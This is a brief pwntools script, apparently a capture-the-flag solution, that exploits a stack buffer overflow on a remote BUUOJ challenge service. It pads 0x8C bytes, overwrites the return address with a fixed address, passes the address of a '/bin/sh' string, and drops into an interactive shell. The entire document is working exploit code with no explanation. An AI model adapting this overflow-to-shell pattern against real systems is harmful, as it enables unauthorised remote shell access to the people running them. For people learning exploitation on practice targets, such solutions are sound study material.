from pwn import *

#p = process("./pwn")
p = remote("node4.buuoj.cn", 28173)

bin_sh_addr = 0x0804A024


payload = b"A" * 0x8C + p32(0x0804849E) + p32(bin_sh_addr)

p.sendline(payload)
p.interactive()
